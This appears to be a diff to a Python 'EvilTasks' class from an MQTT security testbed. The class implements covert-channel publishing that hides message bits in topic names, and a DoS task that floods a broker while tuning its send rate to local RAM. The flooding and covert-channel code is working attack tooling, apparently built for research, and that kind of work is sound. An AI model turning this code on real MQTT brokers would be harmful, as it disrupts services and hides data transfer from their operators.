@@ -11,11 +11,9 @@
 # methods will be added to this class in order to implement new features, attacks and
 # covert channels
 
-import time, numpy as np
-import threading
+import time
+import threading, random, string
 from Utils.Distributions import Distributions
-from Model.MQTT_handler.MQTT_handler import MQTT_handler	#Forse non serve
-import paho.mqtt.client as mqtt
 
 class EvilTasks:
 	
@@ -79,7 +77,7 @@ class EvilTasks:
 
 
 	#Covert publication with specific embedding method
-	def covert_publish(self, publisher, topic, message, payload, qos, method, delay):
+	def covert_publish(self, publisher, topic, message, payload, qos, method, delay, retain=False):
 		
 		bit_msg = ""
 
@@ -91,7 +89,7 @@ class EvilTasks:
 			for bit in bit_msg:
 				new_topic = self.embed_message(topic, bit, method=method)
 				print(f"NEW TOPIC: {new_topic}")
-				self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, payload)
+				self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, payload, retain)
 				time.sleep(delay)
 
 		except Exception as e:
@@ -118,6 +116,7 @@ class EvilTasks:
 			device_type = str(config.get("DeviceType", "legit")).strip().lower()
 			covert_message = config.get("HiddenMessage")
 			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
+			retain = config.get("Retain", False)
 		
 		except Exception as e:
 			print(f"Error while collecting data from configuration: {e}")
@@ -127,7 +126,7 @@ class EvilTasks:
 			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
 		else:
 
-			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
+			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
 			time.sleep(period)
 
 
@@ -156,6 +155,7 @@ class EvilTasks:
 			device_type = str(config.get("DeviceType", "legit")).strip().lower()
 			covert_message = config.get("HiddenMessage")
 			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
+			retain = config.get("Retain", False)
 		except Exception as e:
 			print("Error while reading devices configurations")
 
@@ -185,13 +185,15 @@ class EvilTasks:
 			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
 		else:
 
-			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
+			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
 			time.sleep(period)
 
 
 
 	#DoS attack task for each thread
 	def DoS_task(self, client_id, config, end_time, protocol, retain=False):
+
+		import psutil
 		
 		topic = config["Topic"]
 		qos = int(config["QoS"])
@@ -200,10 +202,63 @@ class EvilTasks:
 		publisher = self.MQTT_object.mqtt_register_client(client_id, protocol)
 
 		while publisher is not None and time.time() < end_time:
-			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
-			#time.sleep(0.1) ->small test
-			time.sleep(publish_interval)
 
+			#CONTROL THE SENDING RATE ACCORDING TO THE AVAILABLE RAM ON THE SYSTEM. IF THE AVAILABLE RAM IS UNDER THE 85% OF THE TOTAL RAM, DECREASE THE PENALTY OTHERWISE ADD 300 MILLISECONDS OF PENALTY BEFORE SENDING OTHER MESSAGES
+			CONTROL_RATE = 0.85
+			virtual_memory = psutil.virtual_memory()
+			TOTAL_RAM = virtual_memory.total
+			AVAILABLE_RAM = virtual_memory.available
+			USED_RAM = TOTAL_RAM - AVAILABLE_RAM
+			# print(f"TOTAL_RAM: {TOTAL_RAM/(1024**3):.2f} GB")
+			# print(f"AVAILABLE_RAM: {AVAILABLE_RAM/(1024**3):.2f} GB")
+			# print(f"USED_RAM: {(TOTAL_RAM-AVAILABLE_RAM)/(1024**3):.3f} GB")
+			# print(f"AVAILABLE_RAM > 0.85 * TOTAL_RAM: {AVAILABLE_RAM} > {(0.85*TOTAL_RAM)}")
+
+			if AVAILABLE_RAM < CONTROL_RATE*TOTAL_RAM:
+				
+				self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
+				time.sleep(publish_interval)
+
+				#FIRST CONTROL METHOD
+				#decrease the penalty
+				publish_interval -= 0.1
+
+
+
+
+				#SECOND CONTROL METHOD
+				#decrease the penalty "dinamically according to the system"
+				publish_interval *= (1 - AVAILABLE_RAM/(CONTROL_RATE*TOTAL_RAM))
+
+
+				if publish_interval < 0:
+					publish_interval = 0
+
+
+			else:
+
+				#FIRST CONTROL METHOD
+				#If there's too much memory occupied, then add a delay of 0.3
+				#publish_interval += 0.3
+
+
+				#SECOND CONTROL METHOD
+				#increase penalty. At least 10 msec
+				publish_interval = 0.01 + publish_interval*(1 + USED_RAM/(CONTROL_RATE*TOTAL_RAM))
+
+				self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
+				time.sleep(publish_interval)
+
+			print(f"Pubish interval: {publish_interval}")
+			#print(f"Remaining time: {end_time-time.time()} with publish interval {publish_interval}")
+			#random_number = random.randint(0, 9999999)  # numero tra 0 e 9999
+			#new_topic = f"{topic}/{random_number}"
+			# new_topic = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
+			# self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, payload, retain)
+			
+			#time.sleep(0.1) #->small test
+			
+			#print("Sto inviando")
 
 
 	#Spawn num_clients threads and each one of them makes a DoS_task
